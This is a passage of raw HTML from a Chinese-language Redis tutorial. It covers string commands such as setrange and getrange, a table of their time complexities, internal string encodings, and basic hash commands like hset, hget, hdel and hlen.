13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngetset key value</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089210985722097-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089210985722097-1\"><span class=\"crayon-e\">getset </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">value</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/f1baee1a54cb6c97123e81bf9a1ed8e9.png\" width=\"440\" height=\"116\"></p>\n<p> </p>\n<h3>9.设置指定位置的字符</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089214611431552\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsetrange key offeset value</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089214611431552-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089214611431552-1\"><span class=\"crayon-e\">setrange </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">offeset </span><span class=\"crayon-v\">value</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/f2a89aaddef1769237c138a167c8a256.png\" width=\"481\" height=\"204\"></p>\n<p> </p>\n<h3>10.获取部分字符串</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089217487344056\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngetrange key start end</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089217487344056-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089217487344056-1\"><span class=\"crayon-e\">getrange </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">start </span><span class=\"crayon-st\">end</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/bdcedf63c932849f40f8599ee80246e1.png\" width=\"456\" height=\"154\"></p>\n<p> </p>\n<h2>时间复杂度</h2>\n<p>在 Redis 中执行任何命令时，都有相应的时间复杂度，复杂度越高也就越费时间，所以在执行 Redis 中的命令时，如果要执行的命令复杂度越高，就越要慎重。下面是字符串命令时间复杂度类型表：</p>\n<table cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td>命令</td>\n<td>时间复杂度</td>\n</tr>\n<tr>\n<td>set key value</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>get key</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>del key</td>\n<td>O(k) k是键的个数</td>\n</tr>\n<tr>\n<td>mset key value</td>\n<td>O(k) k是键的个数</td>\n</tr>\n<tr>\n<td>mget key</td>\n<td>O(k) k是键的个数</td>\n</tr>\n<tr>\n<td>incr key</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>decr key</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>incrby key increment</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>decrby keky increment</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>incrbyfloat key iincrement</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>append key value</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>strlen key</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>setrange key offset value</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>getrange key start end</td>\n<td>O(n) n是字符串长度</td>\n</tr>\n</tbody>\n</table>\n<p> </p>\n<h2>内部编码</h2>\n<p>在 Redis 中字符串类型的内部编码有 3 种：</p>\n<ul>\n<li>int：8 个字节的长整型</li>\n<li>embstr：小于等于 39 个字节的字符串</li>\n<li>raw：大于 39 个字节的字符串</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/d61908824250cc8c8d6438749321f37f.png\" width=\"747\" height=\"367\"></p>\n<p> </p>\n<h1>哈希类型</h1>\n<p>大部分语言基本都提供了哈希类型，如 Java 语言中的 Map 类型及 Python 语言中的字典类型等等。虽然语言不同，但它们基本使用都是一样的，也就是都是键值对结构的。例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08921b976998773\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvalue={{field1, value1}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08921b976998773-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08921b976998773-1\"><span class=\"crayon-v\">value</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">field1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value1</span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>通过下图可以直观感受一下字符串类型和哈希类型的区别：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/d39dbbd2117a887f925b3e8a4ab3cc10.png\" width=\"766\" height=\"404\"></p>\n<p>Redis 中哈希类型都是键值对结构的，所以要特别注意这里的 value 并不是指 Redis 中 key 的 value，而是哈希类型中的 field 所对应的 value。</p>\n<p> </p>\n<h2>命令</h2>\n<p>下面我们还是和介绍字符串类型一样，了解一下 Redis 中哈希类型的相关命令。</p>\n<p> </p>\n<h3>1.设置值</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089221998680618\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhset key field value</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089221998680618-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089221998680618-1\"><span class=\"crayon-e\">hset </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">field </span><span class=\"crayon-v\">value</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/7c21a105a1cede27b0a305ca438fe914.png\" width=\"399\" height=\"168\"></p>\n<p>我们看上图执行的命令知道，hset 命令也是有返回值的。如果 hset 命令设置成功，则返回 1，否则返回 0。除此之外 Redis 也为哈希类型提供了 hsetnx 命令。在前文对字符串的介绍中，我们知道 nx 命令只有当 key 不存在的时候，才能设置成功，同样的，hsetnx 命令在 field 不存在的时候，才能设置成功。</p>\n<p> </p>\n<h3>2.获取值</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089225259673840\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhget key field</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089225259673840-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089225259673840-1\"><span class=\"crayon-e\">hget </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">field</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/9cb74e89cbad15603ac0f0b454d83303.png\" width=\"348\" height=\"88\"></p>\n<p>我们看 hget 命令和 get 有很大的不同，get 命令在获取的时候，只要写一个名字就可以了，而 hget 命令则要写两个名字，第一个名字是 key，第二个名字是 field。当然 key 或者 field 不存在时，返回的结果都是 nil。</p>\n<p> </p>\n<h3>3.删除 field</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089228508516295\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhdel key field [field ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089228508516295-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089228508516295-1\"><span class=\"crayon-e\">hdel </span><span class=\"crayon-e\">key </span><span class=\"crayon-i\">field</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">field</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/051adce8650fe91d1726ed353a087a4e.png\" width=\"406\" height=\"155\"></p>\n<p>hdel 命令删除的时候，也会有返回值，并且这个返回就是成功删除 field 的个数。当 field 不存在时，并不会报错，而是直接返回 0。</p>\n<p> </p>\n<h3>4.计算 field 个数</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08922c386476377\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhlen key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08922c386476377-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08922c386476377-1\"><span class=\"crayon-e\">hlen </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/5879a298476a1a8cccbf849ee847793d.png\" width=\"393\" height=\"130\"></p>\n<p>hlen 命令返回的就是当前 key 中 field 的个数，如果 key 不存在，则返回 0。</p>\n<p> </p>\n<h3>5.批量设置或获取 field-value</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089231514296441\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhmget key field [field ...]\r\nhmset key field value [field value ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089231514296441-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad089231514296441-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" 